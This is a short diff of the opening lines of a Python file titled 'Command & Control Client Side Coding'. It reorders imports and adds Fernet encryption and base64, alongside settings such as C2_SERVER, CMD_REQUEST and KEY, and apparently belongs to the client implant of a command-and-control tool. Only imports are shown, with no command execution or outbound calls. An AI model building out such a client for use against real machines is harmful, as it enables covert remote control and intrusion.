@@ -1,28 +1,29 @@
 """
 Command & Control Client Side Coding
-Author: Davood Yakuza
+Author: Davood Yahay(D.Yakuza)
 """
+# Import os methods based on OS, use platform.system() to detect OS
 from platform import system
-
 # Import for Windows Builds only
 if system() == "Windows":
     from os import getenv, chdir, path, getcwd
-
 # Import for Linux Builds only
 elif system() == "Linux":
     from os import getenv, uname, chdir, path, getcwd
 
 # Import for both Linux & Windows Builds
 from requests import get, exceptions, post
-from time import time, sleep
-from subprocess import run, PIPE, STDOUT
-
 # Custom Features Import
 from colorama import Fore
+from time import time, sleep
+from subprocess import run, PIPE, STDOUT
+from cryptography.fernet import Fernet
+from base64 import urlsafe_b64encode
 
 
-# Constants Import
-from settings import CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PORT, PROXY, HEADERS
+# Settings Variables(Constants) Importing
+from settings import (CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY,
+                      C2_SERVER, DELAY, PORT, PROXY, HEADERS, KEY)
 
 # If Client have Windows OS
 if system() == "Windows":
